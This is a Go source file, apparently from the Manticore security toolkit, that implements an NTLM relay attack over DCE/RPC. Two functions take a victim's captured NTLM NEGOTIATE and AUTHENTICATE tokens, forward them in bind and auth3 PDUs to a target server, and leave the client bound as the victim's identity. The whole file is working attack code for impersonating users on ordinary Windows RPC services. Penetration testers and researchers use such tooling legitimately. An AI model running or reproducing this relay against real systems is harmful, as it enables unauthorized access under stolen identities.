package client

import (
	"fmt"

	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
)

// BindRelayNegotiate performs the first leg of a relayed authenticated bind: it binds
// abstractSyntax and carries a third party's NTLM NEGOTIATE — the victim's, as captured
// by an inbound relay server with its framing intact — as the bind's auth verifier, then
// returns the target's CHALLENGE from the bind_ack for the caller to forward back to the
// victim. Pair it with BindRelayAuthenticate.
//
// Unlike SetAuth, the client holds no credential: the NTLM exchange is driven by the
// victim end to end, and this client only shuttles the tokens. The bind therefore
// authenticates at the connect level only — a relay never learns the NTLM session key
// (it is derived from the victim's secret, which never crosses the relay), so the
// association cannot carry per-PDU signing or sealing. Subsequent calls are issued
// unprotected, which a target accepts for interfaces that do not enforce packet
// integrity or privacy. This is the same "a relay cannot sign" constraint that bounds
// every NTLM relay, and this is the DCE/RPC analogue of the SMB2 client's
// SessionSetupNegotiateBlob / SessionSetupAuthenticateBlob relay seam.
func (c *Client) BindRelayNegotiate(abstractSyntax syntax.SyntaxID, negotiate []byte) (challenge []byte, err error) {
	if len(negotiate) == 0 {
		return nil, fmt.Errorf("dcerpc relay bind: empty NEGOTIATE token")
	}
	if c.bound || c.relayPending {
		return nil, fmt.Errorf("dcerpc relay bind: client already bound")
	}
	if err := c.transport.Connect(); err != nil {
		return nil, fmt.Errorf("dcerpc relay bind: %w", err)
	}

	c.callID = 1
	c.nextCallID = 1 // per-call ids start at 2; the bind used 1
	c.authType = pdu.AuthTypeNTLMSSP
	c.authLevel = pdu.AuthLevelConnect

	contexts := []pdu.ContextElement{{
		ContextID:        0,
		AbstractSyntax:   abstractSyntax,
		TransferSyntaxes: []syntax.SyntaxID{syntax.NDRTransferSyntax()},
	}}
	bind := &pdu.Bind{
		MaxXmitFrag:  c.transport.MaxXmitFrag(),
		MaxRecvFrag:  c.transport.MaxRecvFrag(),
		AssocGroupID: 0,
		ContextList:  contexts,
		SecTrailer:   pdu.SecTrailer{AuthType: c.authType, AuthLevel: c.authLevel, AuthContextID: c.authContextID},
		AuthValue:    negotiate,
	}
	bind.Header = pdu.NewHeader(pdu.PacketTypeBind, pdu.PFCFirstFrag|pdu.PFCLastFrag, c.callID)

	raw, err := bind.Marshal()
	if err != nil {
		return nil, fmt.Errorf("dcerpc relay bind: marshal: %w", err)
	}
	if err := c.transport.Send(raw); err != nil {
		return nil, fmt.Errorf("dcerpc relay bind: send: %w", err)
	}

	respFrag, err := c.readFragment(&fragmentReader{t: c.transport})
	if err != nil {
		return nil, fmt.Errorf("dcerpc relay bind: recv: %w", err)
	}
	hdr, err := pdu.PeekHeader(respFrag)
	if err != nil {
		return nil, fmt.Errorf("dcerpc relay bind: %w", err)
	}
	switch hdr.PacketType {
	case pdu.PacketTypeBindAck:
		var ack pdu.BindAck
		if _, err := ack.Unmarshal(respFrag); err != nil {
			return nil, fmt.Errorf("dcerpc relay bind: parse bind_ack: %w", err)
		}
		ctxID, negotiated, ok := selectContext(bind.ContextList, ack.Results)
		if !ok {
			return nil, fmt.Errorf("dcerpc relay bind: server accepted no presentation context: %s", ack.String())
		}
		c.contextID = ctxID
		c.negotiatedSyntax = negotiated
		c.sendFragMax = negotiateSendMax(c.transport.MaxXmitFrag(), ack.MaxXmitFrag, ack.MaxRecvFrag)
		c.recvFragMax = max(c.transport.MaxRecvFrag(), ack.MaxXmitFrag)

		trailer, challengeBytes, err := pdu.ExtractAuthVerifier(respFrag)
		if err != nil {
			return nil, fmt.Errorf("dcerpc relay bind: read challenge: %w", err)
		}
		if err := c.checkHandshakeTrailer(trailer); err != nil {
			return nil, err
		}
		if len(challengeBytes) == 0 {
			return nil, fmt.Errorf("dcerpc relay bind: server returned no NTLM challenge in bind_ack")
		}
		c.relayPending = true
		return challengeBytes, nil
	case pdu.PacketTypeBindNak:
		var nak pdu.BindNak
		if _, err := nak.Unmarshal(respFrag); err != nil {
			return nil, fmt.Errorf("dcerpc relay bind: parse bind_nak: %w", err)
		}
		return nil, fmt.Errorf("dcerpc relay bind rejected: reject_reason=%d", nak.RejectReason)
	default:
		return nil, fmt.Errorf("dcerpc relay bind: unexpected response PDU type %s", hdr.PacketType)
	}
}

// BindRelayAuthenticate completes a relayed bind started by BindRelayNegotiate by
// sending the victim's NTLM AUTHENTICATE (verbatim, so any SPNEGO mechListMIC and the
// NTLM MIC the victim computed are preserved) in an auth3 PDU, to which the server sends
// no reply. On a nil return the association is bound and the target treats subsequent
// calls as the relayed identity. No session key is derived, so the association operates
// at the connect level — see BindRelayNegotiate.
func (c *Client) BindRelayAuthenticate(authenticate []byte) error {
	if !c.relayPending {
		return fmt.Errorf("dcerpc relay: BindRelayNegotiate has not run")
	}
	if len(authenticate) == 0 {
		return fmt.Errorf("dcerpc relay: empty AUTHENTICATE token")
	}

	a3 := &pdu.Auth3{
		SecTrailer: pdu.SecTrailer{AuthType: c.authType, AuthLevel: c.authLevel, AuthContextID: c.authContextID},
		AuthValue:  authenticate,
	}
	a3.Header = pdu.NewHeader(pdu.PacketTypeAuth3, pdu.PFCFirstFrag|pdu.PFCLastFrag, c.callID)
	raw, err := a3.Marshal()
	if err != nil {
		return fmt.Errorf("dcerpc relay: marshal auth3: %w", err)
	}
	if err := c.transport.Send(raw); err != nil {
		return fmt.Errorf("dcerpc relay: send auth3: %w", err)
	}

	c.relayPending = false
	c.bound = true
	return nil
}
